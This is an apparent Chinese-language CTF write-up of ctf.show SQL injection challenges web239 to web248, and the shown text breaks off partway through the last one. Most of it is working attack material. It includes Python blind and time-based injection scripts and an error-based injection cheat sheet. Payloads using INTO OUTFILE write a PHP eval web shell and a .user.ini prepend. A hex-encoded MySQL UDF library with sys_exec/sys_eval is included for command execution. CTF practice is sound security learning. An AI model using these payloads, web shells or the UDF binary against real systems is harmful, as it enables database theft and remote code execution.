class="headerlink" title="web239"></a>web239</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//过滤空格 or </span></code></pre><p>和之前一样可以使用mysql.innodb_table_stats</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql"># 查表名  banlist,ctfshow_user,flagbbusername&#x3D;z&#39;,(select(group_concat(table_name))from(mysql.innodb_table_stats)where(database_name&#x3D;database())))#&amp;password&#x3D;1# getFlagusername&#x3D;zz&#39;,(select(flag)from(flagbb)))#&amp;password&#x3D;1#  不知道为什么无列名注入不行，wp都是盲猜列名username&#x3D;zz&#39;,(select(concat(&#96;1&#96;,0x2d,&#96;2&#96;,&#96;3&#96;))from((select(1,2,3)(union)select(*)from(flagbb)limit(1,1))a)))#&amp;password&#x3D;1select(concat(&#96;1&#96;,0x2d,&#96;2&#96;,&#96;3&#96;))from((select(1,2,3)(union)select(*)from(flagbb)limit(1,1))a)</code></pre><h4 id="web240"><a href="#web240" class="headerlink" title="web240"></a>web240</h4><p><strong>Hint</strong>: 表名共9位，flag开头，后五位由a&#x2F;b组成，如flagabaab，全小写</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//过滤空格 or sys mysql</span></code></pre><p>表名靠爆破列名靠猜</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> repost_url <span class="token operator">=</span> <span class="token string">"https://3db7384a-eef6-48e0-978e-5d0ddd2f9099.challenge.ctf.show/api/insert.php"</span>flag_url <span class="token operator">=</span> <span class="token string">"https://3db7384a-eef6-48e0-978e-5d0ddd2f9099.challenge.ctf.show/api/?desc&amp;page=1&amp;limit=10"</span>payloads <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">&#123;</span>    <span class="token string">"username"</span><span class="token punctuation">:</span> <span class="token string">"\\"</span><span class="token punctuation">,</span>    <span class="token string">"password"</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f",(select(flag)from(flag</span><span class="token interpolation"><span class="token punctuation">&#123;</span>a<span class="token punctuation">&#125;</span></span><span class="token string">)))#"</span></span><span class="token punctuation">&#125;</span> <span class="token keyword">for</span> a <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>a<span class="token punctuation">&#125;</span></span><span class="token interpolation"><span class="token punctuation">&#123;</span>b<span class="token punctuation">&#125;</span></span><span class="token interpolation"><span class="token punctuation">&#123;</span>c<span class="token punctuation">&#125;</span></span><span class="token interpolation"><span class="token punctuation">&#123;</span>d<span class="token punctuation">&#125;</span></span><span class="token interpolation"><span class="token punctuation">&#123;</span>e<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span> <span class="token keyword">for</span> a <span class="token keyword">in</span> <span class="token string">"ab"</span> <span class="token keyword">for</span> b <span class="token keyword">in</span> <span class="token string">"ab"</span> <span class="token keyword">for</span> c <span class="token keyword">in</span> <span class="token string">"ab"</span> <span class="token keyword">for</span> d <span class="token keyword">in</span> <span class="token string">"ab"</span> <span class="token keyword">for</span> e <span class="token keyword">in</span> <span class="token string">"ab"</span><span class="token punctuation">]</span><span class="token punctuation">]</span>pattern <span class="token operator">=</span> re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">r'ctfshow&#123;[0-9a-fA-F\-]+&#125;'</span><span class="token punctuation">)</span><span class="token keyword">for</span> payload <span class="token keyword">in</span> payloads<span class="token punctuation">:</span>    response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>post_url<span class="token punctuation">,</span> data<span class="token operator">=</span>payload<span class="token punctuation">)</span>    response_flag <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>flag_url<span class="token punctuation">)</span>    <span class="token keyword">match</span> <span class="token operator">=</span> pattern<span class="token punctuation">.</span>search<span class="token punctuation">(</span>response_flag<span class="token punctuation">.</span>text<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token keyword">match</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[*] Found: </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token keyword">match</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>        exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[*] No flag found in the response."</span><span class="token punctuation">)</span></code></pre><h4 id="web241-delete注入"><a href="#web241-delete注入" class="headerlink" title="web241(delete注入)"></a>web241(delete注入)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//删除记录</span><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"delete from  ctfshow_user where id = <span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$id</span><span class="token punctuation">&#125;</span></span>"</span><span class="token punctuation">;</span></code></pre><p>盲注</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"https://01d94186-8d77-44ea-a4c9-c70d61770349.challenge.ctf.show/api/delete.php"</span>flag <span class="token operator">=</span> <span class="token string">""</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>    i <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span>    head <span class="token operator">=</span> <span class="token number">32</span>    tail <span class="token operator">=</span> <span class="token number">127</span>    <span class="token keyword">while</span> head <span class="token operator">&lt;</span> tail<span class="token punctuation">:</span>        mid <span class="token operator">=</span> <span class="token punctuation">(</span>head <span class="token operator">+</span> tail<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">1</span>        <span class="token comment"># 查数据库  banlist,ctfshow_user,flag</span>        <span class="token comment"># payload = "select group_concat(table_name) from information_schema.tables where table_schema=database()"</span>        <span class="token comment"># 查表名  id,flag,info</span>        <span class="token comment"># payload = "select group_concat(column_name) from information_schema.columns where table_name='flag'"</span>        <span class="token comment"># 查数据</span>        payload <span class="token operator">=</span> <span class="token string">"select flag from flag"</span>        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string">'id'</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"if(ascii(substr((</span><span class="token interpolation"><span class="token punctuation">&#123;</span>payload<span class="token punctuation">&#125;</span></span><span class="token string">),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">,1))></span><span class="token interpolation"><span class="token punctuation">&#123;</span>mid<span class="token punctuation">&#125;</span></span><span class="token string">,sleep(0.05),1)#"</span></span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>            tail <span class="token operator">=</span> mid        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>            head <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>    <span class="token keyword">if</span> head <span class="token operator">!=</span> <span class="token number">32</span><span class="token punctuation">:</span>        flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] &#123;&#125; is right"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">break</span></code></pre><h4 id="web242-file注入"><a href="#web242-file注入" class="headerlink" title="web242(file注入)"></a>web242(file注入)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//备份表</span><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"select * from ctfshow_user into outfile '/var/www/html/dump/<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$filename</span><span class="token punctuation">&#125;</span></span>';"</span><span class="token punctuation">;</span>    </code></pre><p>利用info outfile的扩展参数来做题</p><ul><li>SELECT … INTO OUTFILE ‘file_name’<br>    [CHARACTER SET charset_name]<br>    [export_options]</li><li>export_options:<br>[{FIELDS | COLUMNS}<br>    [TERMINATED BY ‘string’]&#x2F;&#x2F;分隔符<br>    [[OPTIONALLY] ENCLOSED BY ‘char’]<br>    [ESCAPED BY ‘char’]<br>]<br>[LINES<br>    [STARTING BY ‘string’]<br>    [TERMINATED BY ‘string’]<br>]</li></ul><p><strong>OPTION</strong>参数为可选参数选项，其可能的取值有：</p><ul><li><p><code>FIELDS TERMINATED BY &#39;字符串&#39;</code>：设置字符串为字段之间的分隔符，可以为单个或多个字符。默认值是“\t”。</p></li><li><p><code>FIELDS ENCLOSED BY &#39;字符&#39;</code>：设置字符来括住字段的值，只能为单个字符。默认情况下不使用任何符号。</p></li><li><p><code>FIELDS OPTIONALLY ENCLOSED BY &#39;字符&#39;</code>：设置字符来括住CHAR、VARCHAR和TEXT等字符型字段。默认情况不使用任何符号。</p></li><li><p><code>FIELDS ESCAPED BY &#39;字符&#39;</code>：设置转义字符，只能为单个字符。默认值为“\”。</p></li><li><p>*<code>LINES STARTING BY &#39;字符串&#39;</code>*：设置每行数据开头的字符，可以为单个或多个字符。默认情况下不使用任何字符。</p></li><li><p>*<code>LINES TERMINATED BY &#39;字符串&#39;</code>*：设置每行数据结尾的字符，可以为单个或多个字符。默认值是“\n”。</p></li></ul><p>可以写马的参数有：</p><p><code>FIELDS TERMINATED BY</code>、 <code>LINES STARTING BY</code>、 <code>LINES TERMINATED BY</code></p><p>在<code>url/api/dump.php</code>下写马</p><p>马在url&#x2F;dump&#x2F;1.php</p><pre class="language-php" data-language="php"><code class="language-php">filename=1.php' LINES STARTING BY "<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>";#</code></pre><p>命令行到根目录输入</p><p><code>find / -name &quot;f*&quot; | xargs grep &quot;ctfshow&quot;</code></p><h4 id="web243"><a href="#web243" class="headerlink" title="web243"></a>web243</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//过滤了php</span></code></pre><p>先上ini：</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">filename&#x3D;.user.ini&#39; LINES STARTING BY &#39;;&#39; TERMINATED BY 0x0a6175746f5f70726570656e645f66696c653a312e6a7067;## auto_prepend_file:1.jpg</code></pre><p>注意16进制是为了0a(换行)发挥作用，而<code>starting by “;”，</code>是想让每行数据的开头字符都是分号，是为了让前面的那个</p><p><code>select * from ctfshow_user</code>查出来的东西与后面的做个了断，然后上🐎</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">filename&#x3D;1.jpg&#39; LINES TERMINATED BY 0x3c3f3d6576616c28245f504f53545b315d293b3f3e;## &lt;?&#x3D;eval($_POST[1]);?&gt;</code></pre><p>（做了半天一直403，看到有一位师傅也是一样，于是把https的s去掉就可以了）</p><h4 id="web244-error注入-updatexml"><a href="#web244-error注入-updatexml" class="headerlink" title="web244(error注入  updatexml)"></a>web244(error注入  updatexml)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//备份表</span><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"select id,username,pass from ctfshow_user where id = '"</span><span class="token operator">.</span><span class="token variable">$id</span><span class="token operator">.</span><span class="token string double-quoted-string">"' limit 1;"</span><span class="token punctuation">;</span></code></pre><pre class="language-mysql" data-language="mysql"><code class="language-mysql">extractvalue(目标xml文档，xml路径):对XML文档进行查询的函数updatexml(目标xml文档，xml路径，更新的内容):更新xml文档的函数其都是针对xml路径进行的注入</code></pre><pre class="language-mysql" data-language="mysql"><code class="language-mysql">?id&#x3D;1&#39; or updatexml(1,concat(0x7e,database(),0x7e),1)+--+  # 0x7e --&gt; ~?id&#x3D;1&#39; or updatexml(1,concat(0x7e,substr((select group_concat(flag) from ctfshow_flag),1,32),0x7e),1)+--+?id&#x3D;1&#39; or updatexml(1,concat(0x7e,(select left(flag,32) from ctfshow_flag),0x7e),1)+--+?id&#x3D;1&#39; or updatexml(1,concat(0x7e,(select right(flag,32) from ctfshow_flag),0x7e),1)+--+</code></pre><p>看到了好东西</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">1. floor + rand + group byselect * from user where id&#x3D;1 and (select 1 from (select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a);select * from user where id&#x3D;1 and (select count(*) from (select 1 union select null union select  !1)x group by concat((select table_name from information_schema.tables  limit 1),floor(rand(0)*2)));2. ExtractValueselect * from user where id&#x3D;1 and extractvalue(1, concat(0x5c, (select table_name from information_schema.tables limit 1)));3. UpdateXmlselect * from user where id&#x3D;1 and 1&#x3D;(updatexml(1,concat(0x3a,(select user())),1));4. Name_Const(&gt;5.0.12)select * from (select NAME_CONST(version(),0),NAME_CONST(version(),0))x;5. Joinselect * from(select * from mysql.user a join mysql.user b)c;select * from(select * from mysql.user a join mysql.user b using(Host))c;select * from(select * from mysql.user a join mysql.user b using(Host,User))c;6. exp()&#x2F;&#x2F;mysql5.7貌似不能用select * from user where id&#x3D;1 and Exp(~(select * from (select version())a));7. geometrycollection()&#x2F;&#x2F;mysql5.7貌似不能用select * from user where id&#x3D;1 and geometrycollection((select * from(select * from(select user())a)b));8. multipoint()&#x2F;&#x2F;mysql5.7貌似不能用select * from user where id&#x3D;1 and multipoint((select * from(select * from(select user())a)b));9. polygon()&#x2F;&#x2F;mysql5.7貌似不能用select * from user where id&#x3D;1 and polygon((select * from(select * from(select user())a)b));10. multipolygon()&#x2F;&#x2F;mysql5.7貌似不能用select * from user where id&#x3D;1 and multipolygon((select * from(select * from(select user())a)b));11. linestring()&#x2F;&#x2F;mysql5.7貌似不能用select * from user where id&#x3D;1 and linestring((select * from(select * from(select user())a)b));12. multilinestring()&#x2F;&#x2F;mysql5.7貌似不能用select * from user where id&#x3D;1 and multilinestring((select * from(select * from(select user())a)b));</code></pre><h4 id="web245-extractvalue"><a href="#web245-extractvalue" class="headerlink" title="web245(extractvalue)"></a>web245(extractvalue)</h4><pre class="language-mysql" data-language="mysql"><code class="language-mysql">&#x2F;&#x2F;无过滤过滤updatexml</code></pre><p>这里使用extractvalue</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql"># 查表名 ctfshow_flagsa?id&#x3D;1&#39; or extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),0x7e))+--+# 查列名 flag1?id&#x3D;1&#39; or extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;ctfshow_flagsa&#39;),0x7e))+--+# getFlag?id&#x3D;1&#39; or extractvalue(1,concat(0x7e,substr((select group_concat(flag1) from ctfshow_flagsa),5,15),0x7e))+--+?id&#x3D;1&#39; or extractvalue(1,concat(0x7e,substr((select group_concat(flag1) from ctfshow_flagsa),20,30),0x7e))+--+</code></pre><h4 id="web246-floor"><a href="#web246-floor" class="headerlink" title="web246(floor)"></a>web246(floor)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//无过滤</span>过滤updatexml extractvalue</code></pre><p>这里使用floor + rand + group by 主要利用主键的重复来实现报错</p><p><a href="https://www.freebuf.com/column/235496.html">Mysql报错注入之floor(rand(0)*2)报错原理探究</a></p><pre class="language-mysql" data-language="mysql"><code class="language-mysql"># 查表名 ctfshow_flags?id&#x3D;1&#39; and (select 1 from (select count(*),concat((select table_name from information_schema.tables where table_schema&#x3D;database() limit 1,1),floor(rand(0)*2))x from information_schema.tables group by x)a);--+# 查列名 flag2?id&#x3D;1&#39; and (select 1 from (select count(*),concat((select column_name from information_schema.columns where table_name&#x3D;&#39;ctfshow_flags&#39; limit 3,1),floor(rand(0)*2))x from information_schema.tables group by x)a) %23# getFlag?id&#x3D;1&#39; and (select 1 from (select count(*),concat((select flag21 from ctfshow_flags1),floor(rand(0)*2))x from information_schema.tables group by x)a) %23</code></pre><h4 id="web247-双查询错误注入、报错注入"><a href="#web247-双查询错误注入、报错注入" class="headerlink" title="web247(双查询错误注入、报错注入)"></a>web247(双查询错误注入、报错注入)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//无过滤</span>过滤updatexml extractvalue floor</code></pre><p><code>floor()：向下取整</code><br><code>ceil()：向上取整</code><br><code>round()：四舍五入</code></p><p>floor替换成其他取整函数即可</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql"># 查表名 ctfshow_flagsa1&#39; and (select 1 from (select count(*),concat((select table_name from information_schema.tables where table_schema&#x3D;database() limit 1,1),ceil(rand(0)*2))x from information_schema.tables group by x)a);%23# 查列名 flag?1&#39; and (select 1 from (select count(*),concat((select column_name from information_schema.columns where table_name&#x3D;&#39;ctfshow_flagsa&#39; limit 1,1),ceil(rand(0)*2))x from information_schema.tables group by x)a);%23# getFlag1&#39; and (select 1 from (select count(*),concat((select &#96;flag?&#96; from ctfshow_flagsa),ceil(rand(0)*2))x from information_schema.tables group by x)a);%23</code></pre><h4 id="web248-udf注入"><a href="#web248-udf注入" class="headerlink" title="web248(udf注入)"></a>web248(udf注入)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"select id,username,pass from ctfshow_user where id = '"</span><span class="token operator">.</span><span class="token variable">$id</span><span class="token operator">.</span><span class="token string double-quoted-string">"' limit 1;"</span><span class="token punctuation">;</span></code></pre><p>mysql的UAF注入,简单来说就是把dll文件写到目标机子的plugin目录，这个目录是可以通过select @@plugin_dir来得到的。此外就是这题可以堆叠注入，我一开始没想到可以堆叠，以为是布尔，其实还是没理解这个UAF注入，最后的导入函数这里：</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">&#x2F;api&#x2F;?id&#x3D;1&#39;; select @@plugin_dir; -- -查出Mysql插件路径：&#x2F;usr&#x2F;lib&#x2F;mariadb&#x2F;plugin&#x2F;&#x2F;api&#x2F;?id&#x3D;&#39;;CREATE FUNCTION sys_eval RETURNS STRING SONAME &#39;udf.so&#39;;--+引入udf.so文件从而创建函数sys_eval</code></pre><pre class="language-mysql" data-language="mysql"><code class="language-mysql">CREATE FUNCTION sys_eval RETURNS STRING SONAME &#39;udf.so&#39;; &#x2F;&#x2F;导入udf函数</code></pre><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsbase_url <span class="token operator">=</span> <span class="token string">"https://49e6bca5-e443-47a8-9a15-8619fb62730f.challenge.ctf.show/api/"</span>payload <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>text <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"a"</span><span class="token punctuation">,</span> <span class="token string">"b"</span><span class="token punctuation">,</span> <span class="token string">"c"</span><span class="token punctuation">,</span> <span class="token string">"d"</span><span class="token punctuation">,</span> <span class="token string">"e"</span><span class="token punctuation">]</span>udf <span class="token operator">=</span> <span class="token string">"7F454C4602010100000000000000000003003E0001000000800A000000000000400000000000000058180000000000000000000040003800060040001C0019000100000005000000000000000000000000000000000000000000000000000000C414000000000000C41400000000000000002000000000000100000006000000C814000000000000C814200000000000C8142000000000004802000000000000580200000000000000002000000000000200000006000000F814000000000000F814200000000000F814200000000000800100000000000080010000000000000800000000000000040000000400000090010000000000009001000000000000900100000000000024000000000000002400000000000000040000000000000050E574640400000044120000000000004412000000000000441200000000000084000000000000008400000000000000040000000000000051E5746406000000000000000000000000000000000000000000000000000000000000000000000000000000000000000800000000000000040000001400000003000000474E5500D7FF1D94176ABA0C150B4F3694D2EC995AE8E1A8000000001100000011000000020000000700000080080248811944C91CA44003980468831100000013000000140000001600000017000000190000001C0000001E000000000000001F00000000000000200000002100000022000000230000002400000000000000CE2CC0BA673C7690EBD3EF0E78722788B98DF10ED971581CA868BE12BBE3927C7E8B92CD1E7066A9C3F9BFBA745BB073371974EC4345D5ECC5A62C1CC3138AFF3B9FD4A0AD73D1C50B5911FEAB5FBE1200000000000000000000000000000000000000000000000000000000000000000300090088090000000000000000000000000000010000002000000000000000000000000000000000000000250000002000000000000000000000000000000000000000CD00000012000000000000000000000000000000000000001E0100001200000000000000000000000000000000000000620100001200000000000000000000000000000000000000E30000001200000000000000000000000000000000000000B90000001200000000000000000000000000000000000000680100001200000000000000000000000000000000000000160000002200000000000000000000000000000000000000540000001200000000000000000000000000000000000000F00000001200000000000000000000000000000000000000B200000012000000000000000000000000000000000000005A01000012000000000000000000000000000000000000005201000012000000000000000000000000000000000000004C0100001200000000000000000000000000000000000000E800000012000B00D10D000000000000D1000000000000003301000012000B00A90F0000000000000A000000000000001000000012000C00481100000000000000000000000000007800000012000B009F0B0000000000004C00000000000000FF0000001200090088090000000000000000000000000000800100001000F1FF101720000000000000000000000000001501000012000B00130F0000000000002F000000000000008C0100001000F1FF201720000000000000000000000000009B00000012000B00480C0000000000000A000000000000002501000012000B00420F0000000000006700000000000000AA00000012000B00520C00000000000063000000000000005B00000012000B00950B0000000000000A000000000000008E00000012000B00EB0B0000000000005D00000000000000790100001000F1FF101720000000000000000000000000000501000012000B00090F0000000000000A00000000000000C000000012000B00B50C000000000000F100000000000000F700000012000B00A20E00000000000067000000000000003900000012000B004C0B0000000000004900000000000000D400000012000B00A60D0000000000002B000000000000004301000012000B00B30F0000000000005501000000000000005F5F676D6F6E5F73746172745F5F005F66696E69005F5F6378615F66696E616C697A65005F4A765F5265676973746572436C6173736573006C69625F6D7973716C7564665F7379735F696E666F5F696E6974006D656D637079006C69625F6D7973716C7564665F7379735F696E666F5F6465696E6974006C69625F6D7973716C7564665F7379735F696E666F007379735F6765745F696E6974007379735F6765745F6465696E6974007379735F67657400676574656E76007374726C656E007379735F7365745F696E6974006D616C6C6F63007379735F7365745F6465696E69740066726565007379735F73657400736574656E76007379735F657865635F696E6974007379735F657865635F6465696E6974007379735F657865630073797374656D007379735F6576616C5F696E6974007379735F6576616C5F6465696E6974007379735F6576616C00706F70656E007265616C6C6F63007374726E6370790066676574730070636C6F7365006C6962632E736F2E36005F6564617461005F5F6273735F7374617274005F656E6400474C4942435F322E322E3500000000000000000000020002000200020002000200020002000200020002000200020001000100010001000100010001000100010001000100010001000100010001000100010001000100010001006F0100001000000000000000751A6909000002009101000000000000F0142000000000000800000000000000F0142000000000007816200000000000060000000200000000000000000000008016200000000000060000000300000000000000000000008816200000000000060000000A0000000000000000000000A81620000000000007000000040000000000000000000000B01620000000000007000000050000000000000000000000B81620000000000007000000060000000000000000000000C01620000000000007000000070000000000000000000000C81620000000000007000000080000000000000000000000D01620000000000007000000090000000000000000000000D816200000000000070000000A0000000000000000000000E016200000000000070000000B0000000000000000000000E816200000000000070000000C0000000000000000000000F016200000000000070000000D0000000000000000000000F816200000000000070000000E00000000000000000000000017200000000000070000000F00000000000000000000000817200000000000070000001000000000000000000000004883EC08E8EF000000E88A010000E8750700004883C408C3FF35F20C2000FF25F40C20000F1F4000FF25F20C20006800000000E9E0FFFFFFFF25EA0C20006801000000E9D0FFFFFFFF25E20C20006802000000E9C0FFFFFFFF25DA0C20006803000000E9B0FFFFFFFF25D20C20006804000000E9A0FFFFFFFF25CA0C20006805000000E990FFFFFFFF25C20C20006806000000E980FFFFFFFF25BA0C20006807000000E970FFFFFFFF25B20C20006808000000E960FFFFFFFF25AA0C20006809000000E950FFFFFFFF25A20C2000680A000000E940FFFFFFFF259A0C2000680B000000E930FFFFFFFF25920C2000680C000000E920FFFFFF4883EC08488B05ED0B20004885C07402FFD04883C408C390909090909090909055803D680C2000004889E5415453756248833DD00B200000740C488D3D2F0A2000E84AFFFFFF488D1D130A20004C8D25040A2000488B053D0C20004C29E348C1FB034883EB014839D873200F1F4400004883C0014889051D0C200041FF14C4488B05120C20004839D872E5C605FE0B2000015B415CC9C3660F1F84000000000048833DC009200000554889E5741A488B054B0B20004885C0740E488D3DA7092000C9FFE00F1F4000C9C39090554889E54883EC3048897DE8488975E0488955D8488B45E08B0085C07421488D0DE7050000488B45D8BA320000004889CE4889C7E89BFEFFFFC645FF01EB04C645FF000FB645FFC9C3554889E548897DF8C9C3554889E54883EC3048897DF8488975F0488955E848894DE04C8945D84C894DD0488D0DCA050000488B45E8BA1F0000004889CE4889C7E846FEFFFF488B45E048C7001E000000488B45E8C9C3554889E54883EC2048897DF8488975F0488955E8488B45F08B0083F801751C488B45F0488B40088B0085C0750E488B45F8C60001B800000000EB20488D0D83050000488B45E8BA2B0000004889CE4889C7E8DFFDFFFFB801000000C9C3554889E548897DF8C9C3554889E54883EC4048897DE8488975E0488955D848894DD04C8945C84C894DC0488B45E0488B4010488B004889C7E8BBFDFFFF488945F848837DF8007509488B45C8C60001EB16488B45F84889C7E84BFDFFFF4889C2488B45D0488910488B45F8C9C3554889E54883EC2048897DF8488975F0488955E8488B45F08B0083F8027425488D0D05050000488B45E8BA1F0000004889CE4889C7E831FDFFFFB801000000E9AB000000488B45F0488B40088B0085C07422488D0DF2040000488B45E8BA280000004889CE4889C7E8FEFCFFFFB801000000EB7B488B45F0488B40084883C004C70000000000488B45F0488B4018488B10488B45F0488B40184883C008488B00488D04024883C0024889C7E84BFCFFFF4889C2488B45F848895010488B45F8488B40104885C07522488D0DA4040000488B45E8BA1A0000004889CE4889C7E888FCFFFFB801000000EB05B800000000C9C3554889E54883EC1048897DF8488B45F8488B40104885C07410488B45F8488B40104889C7E811FCFFFFC9C3554889E54883EC3048897DE8488975E0488955D848894DD0488B45E8488B4010488945F0488B45E0488B4018488B004883C001480345F0488945F8488B45E0488B4018488B10488B45E0488B4010488B08488B45F04889CE4889C7E8EFFBFFFF488B45E0488B4018488B00480345F0C60000488B45E0488B40184883C008488B10488B45E0488B40104883C008488B08488B45F84889CE4889C7E8B0FBFFFF488B45E0488B40184883C008488B00480345F8C60000488B4DF8488B45F0BA010000004889CE4889C7E892FBFFFF4898C9C3554889E54883EC3048897DE8488975E0488955D8C745FC00000000488B45E08B0083F801751F488B45E0488B40088B55FC48C1E2024801D08B0085C07507B800000000EB20488D0DC2020000488B45D8BA2B0000004889CE4889C7E81EFBFFFFB801000000C9C3554889E548897DF8C9C3554889E54883EC2048897DF8488975F0488955E848894DE0488B45F0488B4010488B004889C7E882FAFFFF4898C9C3554889E54883EC3048897DE8488975E0488955D8C745FC00000000488B45E08B0083F801751F488B45E0488B40088B55FC48C1E2024801D08B0085C07507B800000000EB20488D0D22020000488B45D8BA2B0000004889CE4889C7E87EFAFFFFB801000000C9C3554889E548897DF8C9C3554889E54881EC500400004889BDD8FBFFFF4889B5D0FBFFFF488995C8FBFFFF48898DC0FBFFFF4C8985B8FBFFFF4C898DB0FBFFFFBF01000000E8BEF9FFFF488985C8FBFFFF48C745F000000000488B85D0FBFFFF488B4010488B00488D352C0200004889C7E852FAFFFF488945E8EB63488D85E0FBFFFF4889C7E8BDF9FFFF488945F8488B45F8488B55F04801C2488B85C8FBFFFF4889D64889C7E80CFAFFFF488985C8FBFFFF488D85E0FBFFFF488B55F0488B8DC8FBFFFF4801D1488B55F84889C64889CFE8D1F9FFFF488B45F8480145F0488B55E8488D85E0FBFFFFBE000400004889C7E831F9FFFF4885C07580488B45E84889C7E850F9FFFF488B85C8FBFFFF0FB60084C0740A4883BDC8FBFFFF00750C488B85B8FBFFFFC60001EB2B488B45F0488B95C8FBFFFF488D0402C60000488B85C8FBFFFF4889C7E8FBF8FFFF488B95C0FBFFFF488902488B85C8FBFFFFC9C39090909090909090554889E5534883EC08488B05A80320004883F8FF7419488D1D9B0320000F1F004883EB08FFD0488B034883F8FF75F14883C4085BC9C390904883EC08E84FF9FFFF4883C408C300004E6F20617267756D656E747320616C6C6F77656420287564663A206C69625F6D7973716C7564665F7379735F696E666F29000000000000006C69625F6D7973716C7564665F7379732076657273696F6E20302E302E33000045787065637465642065786163746C79206F6E6520737472696E67207479706520706172616D6574657200000000000045787065637465642065786163746C792074776F20617267756D656E74730000457870656374656420737472696E67207479706520666F72206E616D6520706172616D6574657200436F756C64206E6F7420616C6C6F63617465206D656D6F7279007200011B033B800000000F00000008F9FFFF9C00000051F9FFFFBC0000005BF9FFFFDC000000A7F9FFFFFC00000004FAFFFF1C0100000EFAFFFF3C01000071FAFFFF5C01000062FBFFFF7C0100008DFBFFFF9C0100005EFCFFFFBC010000C5FCFFFFDC010000CFFCFFFFFC010000FEFCFFFF1C02000065FDFFFF3C0200006FFDFFFF5C0200001400000000000000017A5200017810011B0C0708900100001C0000001C00000064F8FFFF4900000000410E108602430D0602440C070800001C0000003C0000008DF8FFFF0A00000000410E108602430D06450C07080000001C0000005C00000077F8FFFF4C00000000410E108602430D0602470C070800001C0000007C000000A3F8FFFF5D00000000410E108602430D0602580C070800001C0000009C000000E0F8FFFF0A00000000410E108602430D06450C07080000001C000000BC000000CAF8FFFF6300000000410E108602430D06025E0C070800001C000000DC0000000DF9FFFFF100000000410E108602430D0602EC0C070800001C000000FC000000DEF9FFFF2B00000000410E108602430D06660C07080000001C0000001C010000E9F9FFFFD